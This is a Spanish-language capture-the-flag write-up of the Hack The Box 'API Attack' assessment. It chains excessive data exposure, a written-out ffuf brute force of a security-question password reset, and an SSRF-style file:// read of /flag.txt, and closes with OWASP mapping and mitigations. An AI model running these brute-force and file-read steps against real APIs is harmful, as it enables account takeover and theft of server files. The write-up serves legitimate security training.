---
title: "API Attack - HTB Skills Assessment"
date: 2026-01-26
header:
  image: /assets/images/guias/API_Attack_HTB_Skills_Assessment.png
  teaser: /assets/images/guias/API_Attack_HTB_Skills_Assessment.png
excerpt: "Write-up técnico del HTB Skills Assessment “API Attack”: enumeración de endpoints, abuso de autenticación/autorización y encadenado de fallos típicos en APIs hasta obtener impacto verificable y evidencias reproducibles."
excerpt_separator: "<!--more-->"
categories:
  - guias
feature: true
---


## Escenario

Tras reportar todas las vulnerabilidades en las versiones v0 y v1 del Marketplace de E-Commerce de Inlanefreight, el administrador intentó parchearlas todas en la v2.

Sin embargo, nuevos desarrolladores junior han implementado funcionalidades adicionales en la v2, y el administrador está preocupado de que puedan haber introducido nuevas vulnerabilidades. Evalúa la seguridad de la nueva versión de la API web y aplica todo lo aprendido a lo largo del módulo para comprometerla.

## Objetivo

Envia el contenido de la flag en '/flag.txt'

## Datos

**Cuenta** : htbpentester@hackthebox.com:HTBPentester

**API doc** : /swagger

## Paso 1: Iniciando sesion y compromando usuario y roles

Primero, inicié sesión usando las credenciales de la cuenta proporcionadas y comprobé la información y los roles del usuario.

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-1.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-2.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-3.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-4.png)

Una vez dentro, comprobe los datos de usuario

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-7.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-8.png)

```json
{
  "customer": {
    "id": "3d6b5aba-302b-4c50-a90a-088307d0b637",
    "name": "HTBPentester",
    "email": "htbpentester@hackthebox.com",
    "phoneNumber": "+44 9999 999999",
    "birthDate": "1997-06-21"
  }
}
```

Vi que tenía asignados dos roles:

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-5.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-6.png)

```json
{
  "roles": [
    "Suppliers_Get",
    "Suppliers_GetAll"
  ]
}
```

## Paso 2: Identificando Broken Object Property Level Authorization

Al consultar el endpoint `GET /api/v2/suppliers/all`, descubrí una vulnerabilidad de **Broken Object Property Level Authorization (BOPLA)**, concretamente **Excessive Data Exposure**.

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-9.png)

Esta vulnerabilidad podría provocar:

- **Pérdidas financieras** si los clientes contactan directamente con los proveedores, eludiendo la plataforma de Inlanefreight.
- 
- **Bypass de autenticación y toma de control de cuentas** al realizar fuerza bruta sobre la pregunta de seguridad asociada a las cuentas de usuario.
  
```json
{
  "suppliers": [
    {
      "id": "00ac3d74-6c7d-4ef0-bf15-00851bf353ba",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "James Allen",
      "email": "J.Allen1607@globalsolutions.com",
      "securityQuestion": "SupplierDidNotProvideYet",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },

    ...

    {
      "id": "eac0c347-12e0-4435-b902-c7e22e3c9dd5",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Patrick Howard",
      "email": "P.Howard1536@globalsolutions.com",
      "securityQuestion": "What is your favorite color?",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },
    {
      "id": "b87017cd-c720-43a3-acbe-46bfbfd6e4aa",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Luca Walker",
      "email": "L.Walker1872@globalsolutions.com",
      "securityQuestion": "What is your favorite color?",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },
    {
      "id": "fafebea0-8894-4744-b7de-6c66d5749740",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Tucker Harris",
      "email": "T.Harris1814@globalsolutions.com",
      "securityQuestion": "What is your favorite color?",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },
    {
      "id": "36f17195-395f-443e-93a4-8ceee81c6106",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Brandon Rogers",
      "email": "B.Rogers1535@globalsolutions.com",
      "securityQuestion": "What is your favorite color?",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },
    {
      "id": "73ff2040-8d86-4932-bd3f-6441d648dcca",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Mason Alexander",
      "email": "M.Alexander1650@globalsolutions.com",
      "securityQuestion": "What is your favorite color?",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },

    ...
   
    {
      "id": "b348f695-7f24-4707-a1d9-79ea4d4d2d5a",
      "companyID": "354d9cf9-4df4-49c3-bc4a-e714e7016759",
      "name": "Riley Henderson",
      "email": "R.Henderson1800@futuristicfurniture.com",
      "securityQuestion": "SupplierDidNotProvideYet",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    }
  ]
}
```


Después, me desplacé por la respuesta y observé que algunas cuentas tenían la pregunta de seguridad: “¿Cuál es tu color favorito?”, que es fácil de adivinar.


Además, encontré un endpoint de la API para restablecer contraseñas usando respuestas a preguntas de seguridad: `POST /api/v2/authentication/suppliers/passwords/resets/security-question-answers`.

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-10.png)

### Fuerza Bruta

Para explotar esto, busqué en Internet “color wordlist” y tomé la primera que encontré.

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-16.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-17.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-40.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-19.png)

```sh
$ cat colors.txt | wc -l
75
```

También extraje los 5 correos electrónicos de las cuentas con preguntas de seguridad y los guardé en emails.txt.

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-14.png)

Después, utilicé ffuf para realizar fuerza bruta contra todas las cuentas, ya que comparten la misma pregunta de seguridad, tras probar primero algún valor aleatorio para obtener el mensaje de error y poder filtrarlo (false).

```sh
$ ffuf -w emails.txt:EMAIL -w colors.txt:COLOR -u http://94.237.50.128:55283/api/v2/authentication/suppliers/passwords/resets/security-question-answers -X POST -H 'Content-Type: application/json' -d '{"SupplierEmail": "EMAIL", "SecurityQuestionAnswer": "COLOR", "NewPassword": "123456"}' -fr "false"
```


```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.50.128:55283/api/v2/authentication/suppliers/passwords/resets/security-question-answers
 :: Wordlist         : EMAIL: /home/htb-ac-1333791/emails.txt
 :: Wordlist         : COLOR: /home/htb-ac-1333791/colors.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"SupplierEmail": "EMAIL", "SecurityQuestionAnswer": "COLOR", "NewPassword": "123456"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: false
________________________________________________

[Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 6ms]
    * COLOR: <REDACTED>
    * EMAIL: B.Rogers1535@globalsolutions.com

:: Progress: [375/375] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```

Incié sesión con la cuenta comprometida.

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-21.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-22.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-23.png)

Comprobé que no tenía roles asignados:

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-24.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-25.png)



En este punto, tenía dos opciones:

- Probar todos los endpoints para encontrar una vulnerabilidad de autorización rota.
- Identificar qué acciones podían realizarse sin roles.

Elegí el segundo enfoque.

### Ataque Server-Side Request Forgery (SSRF)

Detecté un campo al consultar la información del usuario actual:

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-26.png)

```json
{
  "supplier": {
    "id": "36f17195-395f-443e-93a4-8ceee81c6106",
    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
    "name": "Brandon Rogers",
    "email": "B.Rogers1535@globalsolutions.com",
    "securityQuestion": "What is your favorite color?",
    "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
  }
}
```

Observé un campo en la respuesta JSON de mi cuenta comprometida: **professionalCVPDFFileURI**.

Y dos endpoints relevantes que permiten subir un archivo y leer el contenido del archivo en Base64.

- GET /api/v2/suppliers/current-user/cv
- POST /api/v2/suppliers/current-user/cv

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-27.png)

Primero, intenté subir un archivo que no era PDF, pero el servidor validó correctamente la extensión del archivo:

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-28.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-29.png)

```json
{
  "errorMessage": "Could not upload the CV, its either malicious or very big in size"
}
```

Después, subí un archivo PDF, que fue aceptado correctamente:

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-30.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-31.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-32.png)

Mientras revisaba otros endpoints de la API, encontré una función de actualización que permitía modificar los datos del usuario, incluida la ruta del archivo:

```
PUT /api/v2/suppliers/current-user
```

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-33.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-34.png)

```json
{
  "supplier": {
    "id": "36f17195-395f-443e-93a4-8ceee81c6106",
    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
    "name": "Brandon Rogers",
    "email": "B.Rogers1535@globalsolutions.com",
    "securityQuestion": "What is your favorite color?",
    "professionalCVPDFFileURI": "file:///app/wwwroot/SupplierCVs/mypdf.pdf"
  }
}
```

Preparé el siguiente payload JSON para cambiar la ruta del archivo y hacer que apunte a /flag.txt, y para comprobar si podía actualizar también datos sensibles (y pude):

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-35.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-36.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-37.png)

Tras actualizar la información del usuario, utilicé el endpoint GET para recuperar el contenido del archivo (que estaba codificado en Base64):

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-38.png)

![alt text](/assets/images/posts/API_Attack_HTB_Skills_Assessment/image-39.png)

Finalmente, decodifiqué la respuesta de la API y obtuve la flag:

```sh
echo "SFRCe2YxOTBiODBjZDU0M2E4NGIyMz .... " | base64 --decode
```

## Conclusion

Esta evaluación de seguridad reveló vulnerabilidades críticas en la API del Marketplace de E-Commerce de Inlanefreight:

- **Excessive Data Exposure (OWASP API #3–2023)**: permitió acceder a información sensible de proveedores.

- **Security Question Weakness (OWASP API #2–2023 — Broken Authentication)**: permitió a un atacante restablecer contraseñas y tomar control de cuentas.

- **Server-Side Request Forgery (SSRF) (OWASP API #7–2023)**: se explotó para acceder a archivos internos del sistema.

Estos problemas ponen de manifiesto la importancia de **implementar controles de acceso robustos**, **mecanismos de autenticación seguros** y una **validación estricta de rutas de archivo**. Las organizaciones deben **aplicar el principio de mínimo privilegio**, **usar autenticación multifactor** y **validar todas las entradas del usuario** para mitigar estos riesgos. Un testing de seguridad adecuado y revisiones de código rigurosas son esenciales para evitar estas vulnerabilidades en versiones futuras.